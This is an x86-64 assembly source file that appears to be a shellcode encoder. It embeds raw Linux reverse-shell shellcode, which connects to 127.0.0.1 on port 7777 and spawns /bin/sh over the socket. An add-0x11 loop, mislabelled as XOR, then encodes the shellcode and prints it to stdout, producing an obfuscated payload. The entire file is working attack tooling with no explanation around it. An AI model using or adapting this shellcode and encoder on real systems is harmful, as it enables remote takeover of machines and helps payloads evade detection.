global _start

segment .data

    addKey equ 0x11

    shellcode: db 0x6a, 0x29, 0x58, 0x6a, 0x2, 0x5f, 0x6a, 0x1, 0x5e, 0x99, 0xf, 0x5, 0x48, 0x89, 0xc5, 0x48, 0xb8, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x2, 0x50, 0x48, 0xb8, 0x3, 0x1, 0x1f, 0x60, 0x7e, 0x1, 0x1, 0x3, 0x48, 0x31, 0x4, 0x24, 0x6a, 0x2a, 0x58, 0x48, 0x89, 0xef, 0x6a, 0x10, 0x5a, 0x48, 0x89, 0xe6, 0xf, 0x5, 0x6a, 0x3, 0x5e, 0x48, 0xff, 0xce, 0x78, 0xb, 0x56, 0x6a, 0x21, 0x58, 0x48, 0x89, 0xef, 0xf, 0x5, 0xeb, 0xef, 0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72, 0x69, 0x1, 0x1, 0x81, 0x34, 0x24, 0x1, 0x1, 0x1, 0x1, 0x31, 0xf6, 0x56, 0x6a, 0x8, 0x5e, 0x48, 0x1, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31, 0xd2, 0x6a, 0x3b, 0x58, 0xf, 0x5
    length equ 121

section .text

_start:

    lea rsi, [shellcode]
    mov rcx, 0x00
    
    xor_loop:    
        mov al, byte [rsi+rcx]
        add al, addKey
        mov byte [rsi+rcx], al
        inc rcx
        cmp rcx, length
        jne xor_loop

    lea rsi, [shellcode]
    mov rdi,0x01
    lea rdx, [length]
    mov rax,0x01
    syscall

    mov rbx,0x00
    mov rax,0x3c
    syscall
